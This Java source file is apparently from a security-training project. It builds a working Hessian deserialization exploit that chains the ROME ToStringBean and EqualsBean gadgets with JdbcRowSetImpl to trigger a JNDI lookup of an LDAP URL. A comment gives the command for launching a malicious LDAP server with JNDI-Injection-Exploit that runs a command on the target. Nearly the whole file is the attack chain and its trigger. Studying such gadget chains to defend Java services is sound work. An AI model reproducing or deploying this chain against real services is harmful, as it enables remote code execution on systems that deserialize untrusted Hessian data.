package com.madaha.codesecone.controller.AdvancedAttack.deserialize.HessianDeserialize;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;


public class Hessian implements Serializable {

    public static <T> byte[] serialize(T o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        HessianOutput output = new HessianOutput(bao);
        output.writeObject(o);
        System.out.println(bao.toString());
        return bao.toByteArray();
    }

    public static <T> T deserialize(byte[] bytes) throws IOException {
        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);
        HessianInput input = new HessianInput(bai);
        Object o = input.readObject();
        return (T) o;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getValue(Object obj, String name) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception{
        HashMap<Object, Object> s = new HashMap<>();
        setValue(s, "size", 2);

        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tb1 = Array.newInstance(nodeC,2);
        Array.set(tb1, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tb1, 1, nodeCons.newInstance(0, v2, v2, null));

        setValue(s, "table", tb1);
        return s;
    }

    /**
     * 利用方式，直接开启ldap恶意服务：
     *      java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "127.0.0.1"
     */
    public static void main(String[] args) throws Exception{
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://127.0.0.1:1389/ca5gmh";
        jdbcRowSet.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

        // 手动生成HashMap，防止提前调用hashCode（）
        HashMap hashMap = makeMap(equalsBean, "1");

        byte[] s = serialize(hashMap);
        System.out.println(s);
        System.out.println((HashMap)deserialize(s));
    }
}
